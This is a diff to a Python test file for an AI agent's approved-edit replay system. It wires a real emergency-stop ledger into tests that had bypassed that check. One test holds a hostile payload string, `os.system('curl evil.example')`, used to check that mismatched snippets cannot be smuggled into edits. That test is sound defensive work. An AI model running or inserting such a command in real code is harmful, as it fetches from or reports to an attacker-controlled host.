@@ -22,6 +22,7 @@ import pytest
 from aios import config
 from aios.core.cerebellum import Cerebellum, PlaybookStep, _parse_step
 from aios.core.replay_writes import (
+    UNGOVERNED_FIXTURE,
     content_digest,
     edit_signature,
     is_approved_edit,
@@ -29,7 +30,16 @@ from aios.core.replay_writes import (
     store_content,
 )
 from aios.memory.db import init_memory_db
+from aios.core.autonomy import AutonomyLedger
 from aios.security import scope_lock
+
+
+class _ClearStop:
+    """A latch that is wired and not engaged."""
+
+    def assert_operational(self):
+        return None
+
 
 _OLD = "return a + b"
 _NEW = "return a - b"
@@ -123,7 +133,14 @@ def test_an_approved_edit_does_not_authorise_the_same_change_elsewhere(db_path):
     """Path is committed too, so an approval does not travel between files."""
     record_edit_approval(_FILE, _OLD, _NEW, db_path=db_path)
 
-    assert is_approved_edit(_FILE, _OLD_D, _NEW_D, db_path=db_path, enabled=True)
+    assert is_approved_edit(
+        _FILE,
+        _OLD_D,
+        _NEW_D,
+        db_path=db_path,
+        enabled=True,
+        emergency_stop=UNGOVERNED_FIXTURE,
+    )
     assert not is_approved_edit(
         "other.py", _OLD_D, _NEW_D, db_path=db_path, enabled=True
     )
@@ -236,7 +253,7 @@ def test_an_edit_outside_the_sandbox_is_permanently_refused(db_path, sandbox):
 # --------------------------------------------------------------------------- #
 
 
-def _agent(sandbox: Path):
+def _agent(sandbox: Path, db_path: Path):
     from aios.agents.tool_agent import ToolAgent
     from aios.core.executor import Executor
 
@@ -249,7 +266,11 @@ def _agent(sandbox: Path):
         Executor(runner=_Runner(), audit_log=lambda *a, **k: None),
         read_root=sandbox,
     )
-    agent.autonomy = None
+    # A REAL ledger with a clear stop. These tests used to set `autonomy = None`,
+    # which made every write authorisation skip the emergency-stop check
+    # entirely -- so they passed while proving nothing about it. Wiring a clear
+    # stop keeps them exercising the control instead of bypassing it.
+    agent.autonomy = AutonomyLedger(db_path=db_path, emergency_stop=_ClearStop())
     return agent
 
 
@@ -262,7 +283,7 @@ def test_an_unapproved_edit_is_blocked(db_path, sandbox, monkeypatch):
     monkeypatch.setattr(config, "MEMORY_DB_PATH", db_path)
     monkeypatch.setattr(config, "REPLAY_APPROVED_WRITES_ENABLED", True)
 
-    output, status, _ = _agent(sandbox)._replay_edit_file(
+    output, status, _ = _agent(sandbox, db_path)._replay_edit_file(
         {
             "filepath": _FILE,
             "old_string": _OLD,
@@ -284,7 +305,7 @@ def test_an_approved_edit_is_applied(db_path, sandbox, monkeypatch):
     monkeypatch.setattr(config, "MEMORY_DB_PATH", db_path)
     monkeypatch.setattr(config, "REPLAY_APPROVED_WRITES_ENABLED", True)
 
-    _, status, failed = _agent(sandbox)._replay_edit_file(
+    _, status, failed = _agent(sandbox, db_path)._replay_edit_file(
         {
             "filepath": _FILE,
             "old_string": _OLD,
@@ -315,7 +336,7 @@ def test_snippets_that_do_not_match_their_digests_cannot_smuggle_text(
     monkeypatch.setattr(config, "REPLAY_APPROVED_WRITES_ENABLED", True)
 
     evil = "import os; os.system('curl evil.example')"
-    _, status, _ = _agent(sandbox)._replay_edit_file(
+    _, status, _ = _agent(sandbox, db_path)._replay_edit_file(
         {
             "filepath": _FILE,
             "old_string": _OLD,
